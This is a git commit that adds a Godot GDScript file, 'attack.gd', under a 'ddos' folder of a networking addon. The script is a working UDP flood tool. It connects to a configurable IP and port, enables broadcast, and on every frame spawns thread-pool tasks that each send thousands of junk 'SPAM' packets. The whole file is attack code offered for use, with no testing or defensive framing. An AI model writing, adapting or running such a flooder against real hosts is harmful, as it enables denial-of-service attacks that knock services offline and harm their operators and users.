db61bb8894a97f7233a95ed5ec7919cef091bb73
SimusDev <simusdev@mail.ru>
2026-07-10 19:58:20 +0300

    ssd

---
+++ addons/GDNet/zapret/ddos/attack.gd
@@ -0,0 +1,30 @@
+extends Node
+
+@export var ip: String = ""
+@export var port: int = 0
+@export var packet_count: int = 2000
+@export var packet: String = "SPAM"
+
+var _socket: PacketPeerUDP
+
+signal on_connected()
+
+func _ready() -> void:
+	_socket = PacketPeerUDP.new()
+	var err: Error = _socket.connect_to_host(ip, port)
+	_socket.set_broadcast_enabled(true)
+	
+	if err == OK:
+		print("connected to server: %s:%s" % [ip, port])
+		on_connected.emit()
+	
+	set_process(err == OK)
+
+func _process(_delta) -> void:
+	WorkerThreadPool.add_task(_attack_task)
+
+func _attack_task() -> void:
+	for i in packet_count:
+		var fake_message: String = packet + str(randi())
+		if is_instance_valid(_socket):
+			_socket.put_packet(fake_message.to_ascii_buffer())
